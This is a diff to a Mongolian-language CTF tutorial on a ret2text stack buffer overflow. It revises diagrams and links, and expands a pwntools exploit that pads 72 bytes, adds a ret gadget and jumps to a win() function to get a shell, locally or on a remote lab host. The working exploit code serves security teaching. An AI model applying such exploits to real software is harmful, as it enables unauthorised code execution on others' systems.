@@ -13,7 +13,8 @@ description: Stack overflow ашиглан программын өөрийн к�
 :::note[Урьдчилсан мэдлэг]
 - C хэлний үндэс, `gets()`/`read()` зэрэг функц
 - x86-64 assembly-ийн суурь (`push`, `call`, `leave`, `ret`)
-- `gdb` (pwndbg эсвэл GEF) болон Python-ий `pwntools` — gdb-г анх удаа ашиглаж байвал [pwndbg үндэс](../../tools/gdb/) хуудсыг уншаарай
+- `gdb` (pwndbg эсвэл GEF) — анх удаа ашиглаж байвал [pwndbg үндэс](../tools/gdb/) хуудсыг уншаарай
+- Python-ий `pwntools` — анх удаа ашиглаж байвал [pwntools үндэс](../tools/pwntools/) хуудсыг уншаарай
 :::
 
 ## Санаа
@@ -21,15 +22,15 @@ description: Stack overflow ашиглан программын өөрийн к�
 Функц дуудагдах үед stack дээр дараах бүтэц үүснэ (64-bit):
 
 ```ansi
-[1m их хаяг[0m                        [36m▲[0m
+[1m их хаяг[0m                                       [36m▲[0m
 [90m┌──────────────────────────┐[0m                   [36m│[0m
-[90m│[0m[1;31m  return address  (8 B)   [0m[90m│[0m  ← rbp + 8      [36m│[0m  [1;31m← бид үүнийг дарж бичнэ[0m
+[90m│[0m[1;31m  return address  (8 B)   [0m[90m│[0m  ← rbp + 8        [36m│[0m  [1;31m← бид үүнийг дарж бичнэ[0m
 [90m├──────────────────────────┤[0m                   [36m│[0m
-[90m│[0m[33m  saved rbp       (8 B)   [0m[90m│[0m  ← rbp          [36m│[0m
+[90m│[0m[33m  saved rbp       (8 B)   [0m[90m│[0m  ← rbp            [36m│[0m
 [90m├──────────────────────────┤[0m                   [36m│[0m  [36mgets() өгөгдлийг[0m
-[90m│[0m[32m                          [0m[90m│[0m                 [36m│[0m  [36mэнэ чиглэлд бичнэ[0m
-[90m│[0m[32m  char buf[...]           [0m[90m│[0m                 [36m│[0m
-[90m│[0m[32m                          [0m[90m│[0m  ← buf          [36m│[0m  [32m← өгөгдөл эндээс эхэлнэ[0m
+[90m│[0m[32m                          [0m[90m│[0m                   [36m│[0m  [36mэнэ чиглэлд бичнэ[0m
+[90m│[0m[32m  char buf[...]           [0m[90m│[0m                   [36m│[0m
+[90m│[0m[32m                          [0m[90m│[0m  ← buf            [36m│[0m  [32m← өгөгдөл эндээс эхэлнэ[0m
 [90m└──────────────────────────┘[0m
 [1m бага хаяг[0m
 ```
@@ -41,8 +42,8 @@ description: Stack overflow ашиглан программын өөрийн к�
 Тиймээс халдлагын өгөгдөл (payload) ердөө хоёр хэсэгтэй:
 
 ```ansi
-[32m[ buf ................ ][0m[33m[ saved rbp ][0m[1;31m[ зорилтот хаяг ][0m
-[90m └──────── padding (offset) ────────┘ └─ return address ─┘[0m
+[32m[ buf ................ ][0m[33m[ saved rbp ][0m[1;31m[    зорилтот хаяг    ][0m
+[90m└──────── padding (offset) ─────────┘└── return address ───┘[0m
 ```
 
 Бидэнд хоёр зүйл л олох хэрэгтэй:
@@ -96,7 +97,7 @@ $ docker run --rm -p 1337:1337 ghcr.io/computer-communication-security-club/pwn-
 
 ## Шийдэл
 
-### 1. Эх кодыг унших
+### 1. Эх код
 
 ```c title="main.c"
 #include <stdio.h>
@@ -176,7 +177,7 @@ Non-debugging symbols:
 [34m0x000000000040122c[0m  [33m_fini[0m
 ```
 
-Зорилтот хаяг: **`0x401196`**. pwntools дээр `elf.sym.win` гэж автоматаар авна.
+Зорилтот хаяг: **`0x401196`**. pwntools дээр `exe.sym.win` гэж автоматаар авна.
 
 :::tip
 Зорилтот хаяг заавал функцийн эхлэл байх албагүй. Функцийн **дунд** байгаа ямар ч зааврын хаяг руу үсэрч болно.
@@ -228,7 +229,7 @@ LEGEND: [33mSTACK[0m | [34mHEAP[0m | [31mCODE[0m | [35mDATA[0m | [31mWX
 [90m   0x4011e1 <vuln+34>    call   gets@plt                    <gets@plt>[0m
 [90m   0x4011e6 <vuln+39>    nop[0m
 [90m   0x4011e7 <vuln+40>    leave[0m
-[1;32m ► [0m[31m0x4011e8[0m <vuln+41>    [38;5;148mret[0m                                <0x6161617461616173>
+[1;32m ► [0m[31m0x4011e8[0m <vuln+41>    [32mret[0m                                <0x6161617461616173>
     ↓
 [34m─────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────[0m
 00:0000│ [1mrsp[0m [33m0x7fffffffd988[0m ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
@@ -275,7 +276,7 @@ Offset = **72**: эхний 72 байт `buf` болон `saved rbp`-г дүүр
 Эхлээд хамгийн энгийн payload-ийг туршъя:
 
 ```python
-payload = b'A' * 72 + p64(elf.sym.win)
+payload = b'A' * 72 + p64(exe.sym.win)
 ```
 
 `win()` руу үсэрч, `"Congrats!"` хэвлэгдэх ч **shell нээгдэхгүй**, `system()` дотор segfault болно.
@@ -289,39 +290,96 @@ glibc-ийн `system()` дотор `movaps` заавар байдаг бөгөө
 
 :::tip
 Өөр нэг арга: `win`-ийн эхний `endbr64` (4 байт) ба `push rbp` (1 байт)-ийг алгасаж
-`elf.sym.win + 5` (`0x40119b`) руу үсрэх. `push` хийгдэхгүй тул бас 8 байтын зөрүү засагдана.
+`exe.sym.win + 5` (`0x40119b`) руу үсрэх. `push` хийгдэхгүй тул бас 8 байтын зөрүү засагдана.
 :::
 
 ### 6. Exploit
 
-```python title="exploit.py"
+`pwn template`-ээр бэлдэц үүсгэнэ (дэлгэрэнгүйг [pwntools үндэс](../tools/pwntools/#pwn-template) хуудаснаас):
+
+```console
+$ pwn template ./ret2text --host localhost --port 1337 --quiet > exploit.py
+$ chmod +x exploit.py
+```
+
+`# -- Exploit goes here --` хэсэгт payload-оо нэмнэ (тодруулсан мөрүүд):
+
+```python title="exploit.py" ins={39-46,49}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 from pwn import *
 
-elf = context.binary = ELF('./ret2text')
-p = process()
+exe = context.binary = ELF(args.EXE or './ret2text')
+
+host = args.HOST or 'localhost'
+port = int(args.PORT or 1337)
+
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+# -- Exploit goes here --
 
 offset = 72
-ret = ROP(elf).find_gadget(['ret'])[0]   # stack-ийг 16 байтад тэгшлэх
+ret = ROP(exe).find_gadget(['ret'])[0]   # stack-ийг 16 байтад тэгшлэх
 
 payload = flat(
     b'A' * offset,   # buf + saved rbp
     ret,             # alignment
-    elf.sym.win,     # win() функцийн хаяг
+    exe.sym.win,     # win() функцийн хаяг
 )
 
-p.sendlineafter(b'name?\n', payload)
-p.interactive()
+io = start()
+io.sendlineafter(b'name?\n', payload)
+io.interactive()
 ```
 
+Эхлээд өөрийн машин дээр (`LOCAL`) туршина:
+
 ```console
-$ python3 exploit.py
+$ ./exploit.py LOCAL
 [*] Switching to interactive mode
 Congrats! Here is your shell:
 $ cat flag.txt
 ```
 
+Ажиллавал сервер рүү ажиллуулна — скриптийг өөрчлөх шаардлагагүй:
+
+```console
+$ ./exploit.py                    # make run-аар асаасан localhost:1337
+$ ./exploit.py HOST=ctf.example.com PORT=31337
+```
+
+:::tip
+Shell нээгдэхгүй байвал `./exploit.py LOCAL DEBUG`-ээр илгээсэн байтуудыг харах,
+эсвэл `./exploit.py LOCAL GDB`-ээр gdb дотор алхам алхмаар шалгаарай.
+:::
+
 `p64()`/`flat()` нь хаягийг **little-endian** 8 байт болгоно: `0x401196` → `\x96\x11\x40\x00\x00\x00\x00\x00`.
-`elf.sym.win` нь хаягийг symbol table-аас автоматаар авдаг тул дахин compile хийсэн ч скрипт ажиллана.
+`exe.sym.win` нь хаягийг symbol table-аас автоматаар авдаг тул дахин compile хийсэн ч скрипт ажиллана.
 
 ## Хамгаалалт
 
